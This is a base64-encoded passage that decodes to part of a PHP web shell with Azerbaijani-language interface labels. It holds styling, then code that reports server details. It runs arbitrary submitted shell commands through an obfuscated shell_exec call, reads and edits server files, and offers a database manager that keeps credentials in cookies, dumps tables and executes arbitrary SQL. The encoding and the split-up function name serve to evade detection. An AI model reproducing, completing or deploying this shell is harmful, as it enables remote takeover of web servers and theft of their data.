CBiYWNrZ3JvdW5kOiAjMUMwQzBDOwp9Ci5mTWFuYWdlciB0Ym9keSB0cjpob3Zlcgp7CiAgICBiYWNrZ3JvdW5kOiAjMDAwMDAwOwp9Ci5mTWFuYWdlciB0aGVhZCB0aAp7CiAgICB0ZXh0LWFsaWduOiBsZWZ0Owp9Ci5mTWFuYWdlciB0aGVhZCB0cgp7CiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMzMzMzMzOwp9Ci5mTWFuYWdlcgp7CiAgICBib3gtc2hhZG93OiAxcHggMXB4IDFweCAxcHggIzMzMzMzMzsKfQouZk1hbmFnZXIgdGhlYWQgdGgKewogICAgcGFkZGluZzogNHB4IDNweDsKfQouZmF5bF9veHUKewogICAgbWFyZ2luOiA1cHggMDsKICAgIHBhZGRpbmc6IDJweDsKICAgIGJveC1zaGFkb3c6IDFweCAxcHggMXB4IDFweCAjMzMzMzMzOwogICAgYmFja2dyb3VuZC1jb2xvcjogI0UxRTFFMTsKICAgIHdpZHRoOiAxMDAlOwogICAgaGVpZ2h0OiA0MDBweDsKICAgIG92ZXJmbG93OiBhdXRvOwp9Ci5idG4KewogICAgYm9yZGVyOiAxcHggc29saWQgI0FDQUU0MDsKICAgIGJhY2tncm91bmQtY29sb3I6ICMyMjNCM0I7CiAgICBjb2xvcjogI0UxRTFFMTsKICAgIHBhZGRpbmc6IDFweCAxMHB4OwogICAgY3Vyc29yOiBwb2ludGVyOwp9Ci5idG46ZGlzYWJsZWQKewogICAgYm9yZGVyOiAxcHggc29saWQgIzg0ODQ4NDsKICAgIGNvbG9yOiAjODQ4NDg0OwogICAgY3Vyc29yOiBub3QtYWxsb3dlZDsKfQouZmlsZV9lZGl0CnsKICAgIG1hcmdpbjogNXB4IDA7CiAgICBwYWRkaW5nOiAycHg7CiAgICBib3gtc2hhZG93OiAxcHggMXB4IDFweCAxcHggIzMzMzMzMzsKICAgIGJhY2tncm91bmQtY29sb3I6ICNFMUUxRTE7CiAgICB3aWR0aDogMTAwJTsKICAgIGhlaWdodDogNDAwcHg7CiAgICBvdmVyZmxvdzogYXV0bzsKfQppbnB1dCwgc2VsZWN0LCB0ZXh0YXJlYQp7CiAgICBiYWNrZ3JvdW5kOiB0cmFuc3BhcmVudCAhaW1wb3J0YW50OwogICAgY29sb3I6ICNmNmE1NmQ7CiAgICBib3JkZXI6IDFweCBzb2xpZCAjRDY5MDVFOwogICAgcGFkZGluZzogNXB4Owp9CnRhYmxlIHRkCnsKICAgIGJvcmRlcjogMXB4IHNvbGlkIHJnYmEoMjE0LCAxNDQsIDk0LCAwLjcpOwogICAgbWluLXdpZHRoOiAyMHB4OwogICAgcGFkZGluZy1sZWZ0OiA1cHg7CiAgICBwYWRkaW5nLXJpZ2h0OiA1cHg7CiAgICBtYXgtd2lkdGg6IDUwMHB4OwogICAgY29sb3I6ICNmZmFkNmY7CiAgICBiYWNrZ3JvdW5kOiAjMjkyOTI5Owp9CnRhYmxlIHRoCnsKICAgIGJvcmRlcjogMXB4IHNvbGlkICNENjkwNUU7CiAgICBwYWRkaW5nLWxlZnQ6IDVweDsKICAgIHBhZGRpbmctcmlnaHQ6IDVweDsKICAgIGNvbG9yOiAjZmZhZDZmOwp9CnRhYmxlIHRkIGRpdgp7CiAgICBvdmVyZmxvdzogYXV0bzsKICAgIHdpZHRoOiAxMDAlOwogICAgaGVpZ2h0OiAxMDAlOwogICAgbWF4LWhlaWdodDogMTAwcHg7Cn0KPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KPD9waHAKCmlmKGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKQp7CiAgICAkcWlkID0gcG9zaXhfZ2V0Z3JnaWQocG9zaXhfZ2V0ZWdpZCgpKTsKICAgICRxcnVwID0gJHFpZFsnbmFtZSddOwogICAgcHJpbnQgIjxzcGFuIGNsYXNzPSdxYWxpbic+VW5hbWU6PC9zcGFuPiAiIC4gcGhwX3VuYW1lKCkgLiAiPGJyLz4iOwogICAgcHJpbnQgIjxzcGFuIGNsYXNzPSdxYWxpbic+VXNlcjo8L3NwYW4+ICIuZ2V0bXl1aWQoKS4iICgiLmdldF9jdXJyZW50X3VzZXIoKS4iKTxici8+IjsKICAgIHByaW50ICI8c3BhbiBjbGFzcz0ncWFsaW4nPkdyb3VwOjwvc3Bhbj4gIi5nZXRteWdpZCgpLiIgKCIuJHFydXAuIik8YnIvPiI7Cn0KZWxzZQp7CiAgICBwcmludCAiPHNwYW4gY2xhc3M9J3FhbGluJz5VbmFtZTo8L3NwYW4+ICIgLiBwaHBfdW5hbWUoKSAuICI8YnIvPiI7CiAgICBwcmludCAiPHNwYW4gY2xhc3M9J3FhbGluJz5Vc2VyOjwvc3Bhbj4gIi5nZXRteXVpZCgpLiIgKCIuZ2V0X2N1cnJlbnRfdXNlcigpLiIpPGJyLz4iOwogICAgcHJpbnQgIjxzcGFuIGNsYXNzPSdxYWxpbic+R3JvdXA6PC9zcGFuPiAiLmdldG15Z2lkKCkuIjxici8+IjsKfQpwcmludCAiPHNwYW4gY2xhc3M9J3FhbGluJz5EaXNhYmxlIGZ1bmN0aW9uczo8L3NwYW4+ICIgLiAoaW1wbG9kZSgiLCAiLCAkYmFxbGlGdW5rc2l5YWxhcik9PSIiPyI8c3BhbiBjbGFzcz0nc3VjY2Vzcyc+eW94ZHUgOikiOiI8c3BhbiBjbGFzcz0nYmFkJz4iLiBpbXBsb2RlKCIsICIsICRiYXFsaUZ1bmtzaXlhbGFyKSkgLiAiPC9zcGFuPjxici8+IjsKcHJpbnQgIjxzcGFuIGNsYXNzPSdxYWxpbic+U2FmZSBtb2RlOiA8L3NwYW4+IiAuICgkc2FmZU1vZGU9PT10cnVlPyI8c3BhbiBjbGFzcz0nYmFkJz5PbiI6IjxzcGFuIGNsYXNzPSdzdWNjZXNzJz5PZmYiKSAuICI8L3NwYW4+PHNwYW4gc3R5bGU9J21hcmdpbi1sZWZ0OiA1MHB4Oyc+PGEgaHJlZj0namF2YXNjcmlwdDpzZWhpZmUoXCI/bmU9cGhwaW5mb1wiKSc+WyBQSFBpbmZvIF08L2E+PC9zcGFuPjxici8+IjsKcW92bHVxdVlheigpOwpwcmludCAnPGhyPic7CmlmKCRuZT09InBocGluZm8iKQp7CiAgICBwcmludCAiPGRpdiBzdHlsZT0nd2lkdGg6IDEwMCU7IGhlaWdodDogNDAwcHg7Jz48aWZyYW1lIHNyYz0nP25lPXBpbmYnIHN0eWxlPSd3aWR0aDogMTAwJTsgaGVpZ2h0OiA0MDBweDsgYm9yZGVyOiAwOyc+PC9pZnJhbWU+PC9kaXY+IjsKfQplbHNlIGlmKCRuZT09InNpc3RlbV9rb20iKQp7CiAgICBpZiggaXNzZXQoICRfUE9TVFsna29tJ10gKSAmJiBpc19zdHJpbmcoJF9QT1NUWydrb20nXSkgJiYgIWVtcHR5KCRfUE9TVFsna29tJ10pICkKICAgIHsKICAgICAgICAka29tYW5kYSA9IGRlc2hpZnJlbGUodXJsZGVjb2RlKCRfUE9TVFsna29tJ10pKTsKICAgICAgICAKICAgICAgICAkayA9ICdzaCc7CiAgICAgICAgJGsuPSdlbCc7CiAgICAgICAgJGsuPSdsX2UnOwogICAgICAgICRrLj0neGUnOwogICAgICAgICRrLj0nYyc7CgogICAgICAgICRvdXRwdXQgPSAkaygka29tYW5kYSk7CgogICAgICAgIHByaW50ICc8cHJlIHN0eWxlPSJtYXgtaGVpZ2h0OiAzNTBweDtvdmVyZmxvdzogYXV0bzsgYm9yZGVyOiAxcHggc29saWQgIzc3NzsgcGFkZGluZzogNXB4OyI+JyAuIGh0bWxzcGVjaWFsY2hhcnMoJG91dHB1dCkgLiAnPC9wcmU+PGhyPic7CiAgICB9CiAgICBwcmludCAnPGlucHV0IHR5cGU9InRleHQiIGlkPSJlbXJfZXRfYXRhc2giIHN0eWxlPSJ3aWR0aDogNTAwcHg7Ij4gPGJ1dHRvbiB0eXBlPSJidXR0b24iIGNsYXNzPSJidG4iIG9uY2xpY2s9InNpc3RlbUtvbSgpOyI+QmFzPC9idXR0b24+JzsKfQplbHNlIGlmKCRuZT09ImZheWxfb3h1IiAmJiBpc3NldCgkX1BPU1RbJ2ZheWwnXSkgJiYgIiIhPSh0cmltKCRfUE9TVFsnZmF5bCddKSkpCnsKICAgICRmYXlsQWRpID0gYmFzZW5hbWUoZGVzaGlmcmVsZSh1cmxkZWNvZGUoJF9QT1NUWydmYXlsJ10pKSk7CiAgICAkYXlpcmljaSA9IHN1YnN0cigkZGVmYXVsdF9kaXIsc3RybGVuKCRkZWZhdWx0X2RpciktMSkhPSIvIiAmJiBzdWJzdHIoJGZheWxBZGksMCwxKSE9Ii8iID8gIi8iIDogIiI7CiAgICBpZihpc19maWxlKCRkZWZhdWx0X2RpciAuICRheWlyaWNpIC4gJGZheWxBZGkpICYmIGlzX3JlYWRhYmxlKCRkZWZhdWx0X2RpciAuICRheWlyaWNpIC4gJGZheWxBZGkpKQogICAgewogICAgICAgICRlbGF2ZUJ0biA9IGlzX3dyaXRlYWJsZSgkZGVmYXVsdF9kaXIgLiAkYXlpcmljaSAuICRmYXlsQWRpKSA/ICIgb25jbGljaz0nc2VoaWZlKFwiP25lPWZheWxfcmVkYWt0ZSZmYXlsPSIudXJsZW5jb2RlKHVybGVuY29kZShzaGlmcmVsZSgkZmF5bEFkaSkpKS4iJnFvdmx1cT0iLnVybGVuY29kZSh1cmxlbmNvZGUoc2hpZnJlbGUoJGRlZmF1bHRfZGlyKSkpLiJcIiknIiA6ICIgZGlzYWJsZWQiOwogICAgICAgIHByaW50ICI8ZGl2PkZheWwgYWQmIzMwNTs6IDxzcGFuIGNsYXNzPSdxYWxpbic+Ii5odG1sc3BlY2lhbGNoYXJzKCRmYXlsQWRpKS4iPC9zcGFuPjxici8+PGJ1dHRvbiBjbGFzcz0nYnRuJyRlbGF2ZUJ0bj4gRCYjNjAxO3lpJiMzNTE7IDwvYnV0dG9uPjwvZGl2PiI7CiAgICAgICAgcHJpbnQgIjxkaXYgY2xhc3M9J2ZheWxfb3h1Jz4iLmhpZ2hsaWdodF9zdHJpbmcoZmlsZV9nZXRfY29udGVudHMoJGRlZmF1bHRfZGlyIC4gJGF5aXJpY2kgLiAkZmF5bEFkaSksIHRydWUpLiI8L2Rpdj4iOwogICAgfQp9CmVsc2UgaWYoJG5lID09ICdza2wnKQp7CiAgICAkaG9zdCA9IGlzc2V0KCRfQ09PS0lFWydob3N0J10pID8gJF9DT09LSUVbJ2hvc3QnXSA6ICcnOwogICAgJHVzZXIgPSBpc3NldCgkX0NPT0tJRVsndXNlciddKSA/ICRfQ09PS0lFWyd1c2VyJ10gOiAnJzsKICAgICRwYXJvbCA9IGlzc2V0KCRfQ09PS0lFWydwYXJvbCddKSA/ICRfQ09PS0lFWydwYXJvbCddIDogJyc7CiAgICAkYmF6YSA9IGlzc2V0KCRfQ09PS0lFWydiYXphJ10pID8gJF9DT09LSUVbJ2JhemEnXSA6ICcnOwoKICAgIGlmKCBpc3NldCgkX1BPU1RbJ2hvc3QnXSAsICRfUE9TVFsndXNlciddICwgJF9QT1NUWydwYXJvbCddKQogICAgICAgICYmIGlzX3N0cmluZygkX1BPU1RbJ2hvc3QnXSkgJiYgaXNfc3RyaW5nKCRfUE9TVFsndXNlciddKSAmJiBpc19zdHJpbmcoJF9QT1NUWydwYXJvbCddKQogICAgKQogICAgewogICAgICAgICRob3N0ID0gJF9QT1NUWydob3N0J107CiAgICAgICAgJHVzZXIgPSAkX1BPU1RbJ3VzZXInXTsKICAgICAgICAkcGFyb2wgPSAkX1BPU1RbJ3Bhcm9sJ107CiAgICAgICAgJGJhemEgPSAnJzsKCiAgICAgICAgc2V0Y29va2llKCdob3N0JyAsICRob3N0ICwgdGltZSgpICsgMzYwMDAwKTsKICAgICAgICBzZXRjb29raWUoJ3VzZXInICwgJHVzZXIgLCB0aW1lKCkgKyAzNjAwMDApOwogICAgICAgIHNldGNvb2tpZSgncGFyb2wnICwgJHBhcm9sICwgdGltZSgpICsgMzYwMDAwKTsKICAgICAgICBzZXRjb29raWUoJ2JhemEnICwgJGJhemEgLCB0aW1lKCkgKyAzNjAwMDApOwogICAgfQoKICAgIGlmKCBpc3NldCgkX1BPU1RbJ2JhemEnXSkgJiYgaXNfc3RyaW5nKCRfUE9TVFsnYmF6YSddKSApCiAgICB7CiAgICAgICAgJGJhemEgPSAkX1BPU1RbJ2JhemEnXTsKCiAgICAgICAgc2V0Y29va2llKCdiYXphJyAsICRiYXphICwgdGltZSgpICsgMzYwMDAwKTsKICAgIH0KCiAgICAkYmF6YVN0ciA9IGVtcHR5KCRiYXphKSA/ICcnIDogJ2RibmFtZT0nIC4gJGJhemEgLiAnOyc7CgogICAgPz4KICAgIDxmb3JtIG1ldGhvZD0iUE9TVCI+CiAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ibmUiIHZhbHVlPSJza2wiPgogICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBwbGFjZWhvbGRlcj0iSG9zdG5hbWUiIG5hbWU9Imhvc3QiIHZhbHVlPSI8Pz1odG1sc3BlY2lhbGNoYXJzKCRob3N0KT8+Ij4KICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgcGxhY2Vob2xkZXI9IlVzZXIiIG5hbWU9InVzZXIiIHZhbHVlPSI8Pz1odG1sc3BlY2lhbGNoYXJzKCR1c2VyKT8+Ij4KICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgcGxhY2Vob2xkZXI9IlBhcm9sIiBuYW1lPSJwYXJvbCIgdmFsdWU9Ijw/PWh0bWxzcGVjaWFsY2hhcnMoJHBhcm9sKT8+Ij4KICAgICAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iRGF4aWwgb2wiPgogICAgPC9mb3JtPgogICAgPD9waHAKICAgIGlmKCAhZW1wdHkoICRob3N0ICkgKQogICAgewogICAgICAgIHRyeQogICAgICAgIHsKICAgICAgICAgICAgJHBkbyA9IG5ldyBQRE8oJ215c3FsOmhvc3Q9JyAuICRob3N0IC4gJztjaGFyc2V0PXV0Zjg7JyAuICRiYXphU3RyICwgJHVzZXIgLCAkcGFyb2wsYXJyYXkoUERPOjpNWVNRTF9BVFRSX0lOSVRfQ09NTUFORCA9PiAiU0VUIE5BTUVTICd1dGY4JyIpKTsKICAgICAgICAgICAgJHBkby0+c2V0QXR0cmlidXRlKFBETzo6QVRUUl9ERUZBVUxUX0ZFVENIX01PREUsIFBETzo6RkVUQ0hfQVNTT0MpOwoKICAgICAgICAgICAgJHNjaGVtYXRhcyA9ICRwZG8tPnF1ZXJ5KCdTRUxFQ1Qgc2NoZW1hX25hbWUgRlJPTSBpbmZvcm1hdGlvbl9zY2hlbWEuc2NoZW1hdGEnKTsKICAgICAgICAgICAgcHJpbnQgJzxmb3JtIG1ldGhvZD0iUE9TVCI+PGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ibmUiIHZhbHVlPSJza2wiPjxzZWxlY3QgbmFtZT0iYmF6YSI+JzsKICAgICAgICAgICAgZm9yZWFjaCgkc2NoZW1hdGFzLT5mZXRjaEFsbCgpIEFTICRzY2hlbWFOYW1lKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBwcmludCAnPG9wdGlvbicgLiAoJGJhemEgPT0gJHNjaGVtYU5hbWVbJ3NjaGVtYV9uYW1lJ10gPyAnIHNlbGVjdGVkJyA6ICcnKSAuICc+Jy5odG1sc3BlY2lhbGNoYXJzKCRzY2hlbWFOYW1lWydzY2hlbWFfbmFtZSddKS4nPC9vcHRpb24+JzsKICAgICAgICAgICAgfQogICAgICAgICAgICBwcmludCAnPC9zZWxlY3Q+IDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJTZWNoISI+PC9mb3JtPic7CgogICAgICAgICAgICBpZiggIWVtcHR5KCRiYXphKSApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICR0YWJsZXMgPSAkcGRvLT5wcmVwYXJlKCdTRUxFQ1QgdGFibGVfbmFtZSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgd2hlcmUgdGFibGVfc2NoZW1hPT8nKTsKICAgICAgICAgICAgICAgICR0YWJsZXMtPmV4ZWN1dGUoYXJyYXkoJGJhemEpKTsKICAgICAgICAgICAgICAgICR0YWJsZXMgPSAkdGFibGVzLT5mZXRjaEFsbCgpOwoKICAgICAgICAgICAgICAgIHByaW50ICc8ZGl2IHN0eWxlPSJmbG9hdDogbGVmdDsgd2lkdGg6IDIwJTsgb3ZlcmZsb3c6IGF1dG87IGJvcmRlci1yaWdodDogMXB4IHNvbGlkICM5OTk7Ij4nOwogICAgICAgICAgICAgICAgcHJpbnQgJzxhIGhyZWY9ImphdmFzY3JpcHQ6c2VoaWZlKFwnP25lPXNrbF9kXCcpOyI+ISEgRHVtcCBEQiAhITwvYT48aHI+JzsKICAgICAgICAgICAgICAgIGZvcmVhY2goICR0YWJsZXMgQVMgJHRhYmxlTmFtZSApCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJHRhYmxlTmFtZSA9ICR0YWJsZU5hbWVbJ3RhYmxlX25hbWUnXTsKICAgICAgICAgICAgICAgICAgICBwcmludCAnPGEgaHJlZj0iamF2YXNjcmlwdDpzZWhpZmUoXCc/bmU9c2tsJnQ9JyAuIHVybGVuY29kZSh1cmxlbmNvZGUoc2hpZnJlbGUoJHRhYmxlTmFtZSkpKSAuICdcJykiPicuaHRtbHNwZWNpYWxjaGFycygkdGFibGVOYW1lKS4nPC9hPjxicj4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgcHJpbnQgJzwvZGl2Pic7CiAgICAgICAgICAgICAgICBwcmludCAnPGRpdiBzdHlsZT0iZmxvYXQ6IGxlZnQ7IHBhZGRpbmctbGVmdDogMTBweDsgd2lkdGg6IDc1JTsiPic7CgogICAgICAgICAgICAgICAgaWYoIGlzc2V0KCRfUE9TVFsndCddKSAmJiBpc19zdHJpbmcoJF9QT1NUWyd0J10pICYmICFlbXB0eSgkX1BPU1RbJ3QnXSkgKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICR0YWJsZU5hbWUgPSBkZXNoaWZyZWxlKHVybGRlY29kZSgkX1BPU1RbJ3QnXSkpOwogICAgICAgICAgICAgICAgICAgIHByaW50ICc8c3BhbiBjbGFzcz0icWFsaW4iPlRhYmxlOjwvc3Bhbj4gJyAuIGh0bWxzcGVjaWFsY2hhcnMoJHRhYmxlTmFtZSkgLiAnICggPGEgaHJlZj0iamF2YXNjcmlwdDpzZWhpZmUoXCc/bmU9c2tsX2RfdCZ0PScudXJsZW5jb2RlKHVybGVuY29kZShzaGlmcmVsZSgkdGFibGVOYW1lKSkpLidcJykiPkR1bXA8L2E+ICk8YnI+JzsKCiAgICAgICAgICAgICAgICAgICAgJGdldENvbHVtbnMgPSAkcGRvLT5wcmVwYXJlKCJTRUxFQ1QgY29sdW1uX25hbWUgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyB3aGVyZSB0YWJsZV9zY2hlbWE9PyBhbmQgdGFibGVfbmFtZT0/Iik7CiAgICAgICAgICAgICAgICAgICAgJGdldENvbHVtbnMtPmV4ZWN1dGUoYXJyYXkoJGJhemEgLCAkdGFibGVOYW1lKSk7CiAgICAgICAgICAgICAgICAgICAgJGNvbHVtbnMgPSAkZ2V0Q29sdW1ucy0+ZmV0Y2hBbGwoKTsKCiAgICAgICAgICAgICAgICAgICAgaWYoICRjb2x1bW5zICkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRkYXRhQ291bnQgPSAkcGRvLT5xdWVyeSgnU0VMRUNUIGNvdW50KDApIEFTIHNzIGZyb20gYCcgLiAkdGFibGVOYW1lIC4gJ2AnKTsKICAgICAgICAgICAgICAgICAgICAgICAgJGRhdGFDb3VudCA9IChpbnQpJGRhdGFDb3VudC0+ZmV0Y2hDb2x1bW4oKTsKCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICc8c3BhbiBjbGFzcz0icWFsaW4iPkNvdW50Ojwvc3Bhbj4gJyAuICRkYXRhQ291bnQgLiAnPGJyPjxicj4nOwoKICAgICAgICAgICAgICAgICAgICAgICAgJHBhZ2VzID0gY2VpbCgkZGF0YUNvdW50IC8gMTAwKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICRjdXJyZW50UGFnZSA9IGlzc2V0KCRfUE9TVFsnc2VoaWZlJ10pICYmIGlzX251bWVyaWMoJF9QT1NUWydzZWhpZmUnXSkgJiYgJF9QT1NUWydzZWhpZmUnXSA+PSAxICYmICRfUE9TVFsnc2VoaWZlJ10gPD0gJHBhZ2VzID8gKGludCkkX1BPU1RbJ3NlaGlmZSddIDogMTsKCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciAoICAkcCA9IDE7ICRwIDw9ICRwYWdlczsgJHArKyApCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICc8YSBzdHlsZT0iJy4oJGN1cnJlbnRQYWdlID09ICRwID8gJ2JhY2tncm91bmQ6ICM0NDQ7JyA6ICcnKS4nbWFyZ2luLWxlZnQ6IDJweDsgbWFyZ2luLWJvdHRvbTogNXB4OyBwYWRkaW5nOiAycHggNnB4OyBib3JkZXI6IDFweCBzb2xpZCAjQUNCNzU0OyB0ZXh0LWRlY29yYXRpb246IG5vbmU7IiBocmVmPSJqYXZhc2NyaXB0OnNlaGlmZShcJz9uZT1za2wmdD0nIC4gdXJsZW5jb2RlKHVybGVuY29kZShzaGlmcmVsZSgkdGFibGVOYW1lKSkpIC4gJyZzZWhpZmU9JyAuICRwIC4gJ1wnKTsiPicgLiAkcCAuICc8L2E+ICc7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJzxicj48YnI+JzsKCiAgICAgICAgICAgICAgICAgICAgICAgICRzdGFydCA9IDEwMCAqICgkY3VycmVudFBhZ2UgLSAxKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICRkYXRhID0gJHBkby0+cXVlcnkoJ1NFTEVDVCAqIEZST00gYCcgLiAkdGFibGVOYW1lIC4nYCBMSU1JVCAnLiRzdGFydC4nICwgMTAwJyk7CiAgICAgICAgICAgICAgICAgICAgICAgICRkYXRhID0gJGRhdGEtPmZldGNoQWxsKCk7CiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICc8dGFibGU+PHRoZWFkPic7CgogICAgICAgICAgICAgICAgICAgICAgICBmb3JlYWNoKCAkY29sdW1ucyBBUyAkY29sdW1uSW5mICkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJzx0aD4nIC4gaHRtbHNwZWNpYWxjaGFycygkY29sdW1uSW5mWydjb2x1bW5fbmFtZSddKSAuICc8L3RoPic7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICc8L3RoZWFkPjx0Ym9keT4nOwoKICAgICAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCggJGRhdGEgQVMgJHJvdyApCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICc8dHI+JzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvcmVhY2goICRyb3cgQVMgJGtleT0+JHZhbCApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJzx0ZD48ZGl2PicgLiAkdmFsIC4gJzwvZGl2PjwvdGQ+JzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICc8L3RyPic7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJzwvdHI+PC90Ym9keT48L3RhYmxlPic7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdUYWJsZSBub3QgZm91bmQhJzsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIGlmICggaXNzZXQoJF9QT1NUWydlbXInXSkgJiYgaXNfc3RyaW5nKCRfUE9TVFsnZW1yJ10pICYmICFlbXB0eSgkX1BPU1RbJ2VtciddKSApCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJGVtciA9IGRlc2hpZnJlbGUodXJsZGVjb2RlKCRfUE9TVFsnZW1yJ10pKTsKICAgICAgICAgICAgICAgICAgICBwcmludCAnPHNwYW4gY2xhc3M9InFhbGluIj5TUUwgZW1yOjwvc3Bhbj4gJyAuIGh0bWxzcGVjaWFsY2hhcnMoJGVtcikgLiAnPGJyPic7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgJGRhdGEgPSAkcGRvLT5xdWVyeSggJGVtciApOwogICAgICAgICAgICAgICAgICAgICRkYXRhID0gJGRhdGEtPmZldGNoQWxsKCk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgcHJpbnQgJzx0YWJsZT48dGhlYWQ+JzsKICAgICAgICAgICAgICAgICAgICBpZiggY291bnQoJGRhdGEpID4gMCApCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnPHRyPic7CiAgICAgICAgICAgICAgICAgICAgICAgIGZvcmVhY2goICRkYXRhWzBdIEFTICRrZXk9PiR2YWwgKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnPHRoPjxkaXY+JyAuICRrZXkgLiAnPC9kaXY+PC90aD4nOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICc8L3RyPic7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIHByaW50ICc8L3RoZWFkPjx0Ym9keT4nOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGZvcmVhY2goICRkYXRhIEFTICRyb3cgKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJzx0cj4nOwogICAgICAgICAgICAgICAgICAgICAgICBmb3JlYWNoKCAkcm93IEFTICRrZXk9PiR2YWwgKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnPHRkPjxkaXY+JyAuICR2YWwgLiAnPC9kaXY+PC90ZD4nOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICc8L3RyPic7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIHByaW50ICc8L3RyPjwvdGJvZHk+PC90YWJsZT4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBwcmludCAnPGRpdj48dGV4dGFyZWEgaWQ9InNrbF9lbXIiPjwvdGV4dGFyZWE+PGJ1dHRvbiB0eXBlPSJidXR0b24iIG9uY2xpY2s9InNrbF9iYXMoKTsiPkJhcyBtZW5lPC9idXR0b24+PC9kaXY+JzsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgcHJpbnQgJzwvZGl2Pic7CiAgICAgICAgICAgICAgICBwcmludCAnPGRpdiBzdHlsZT0iY2xlYXI6IGJvdGg7Ij48L2Rpdj4nOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGNhdGNoIChFeGNlcHRpb24gJGUpCiAgICAgICAgewogICAgICAgICAgICBwcmludCAkZS0+Z2V0TWVzc2FnZSgpOwogICAgICAgIH0KICAgIH0KfQplbHNlIGlmKCRuZT09ImZheWxfcmVkYWt0ZSIgJiYgaXNzZXQoJF9QT1NUWydmYXlsJ10pICYmICIiIT0odHJpbSgkX1BPU1RbJ2ZheWwnXSkpKQp7CiAgICAkZmF5bEFkaSA9IGJhc2VuYW1lKGRlc2hpZnJlbGUodXJsZGVjb2RlKHVybGRlY29kZSgkX1BPU1RbJ2ZheWwnXSkpKSk7CiAgICAkYXlpcmljaSA9IHN1YnN0cigkZGVmYXVsdF9kaXIsc3RybGVuKCRkZWZhdWx0X2RpciktMSkhPSIvIiAmJiBzdWJzdHIoJGZheWxBZGksMCwxKSE9Ii8iID8gIi8iIDogIiI7CiAgICBpZihpc19maWxlKCRkZWZhdWx0X2RpciAuICRheWlyaWNpIC4gJGZheWxBZGkpICYmIGlzX3JlYWRhYmxlKCRkZWZhdWx0X2RpciAuICRheWlyaWNpIC4gJGZheWxBZGkpKQogICAgewogICAgICAgICRzdGF0dXMgPSAiIjsKICAgICAgICBpZihpc3NldCgkX1BPU1RbJ2NvbnRlbnQnXSkgJiYgaXNzZXQoJF9QT1NUWyd0b29rJ10pICYmICRfUE9TVFsndG9vayddIT0iIiAmJiBpc3NldCgkX1NFU1NJT05bJ3lzX3Rvb2snXSkgJiYgJF9TRVNTSU9OWyd5c190b29rJ109PSRfUE9TVFsndG9vayddICYmIGlzX3dyaXRlYWJsZSgkZGVmYXVsdF9kaXIgLiAkYXlpcmljaSAuIC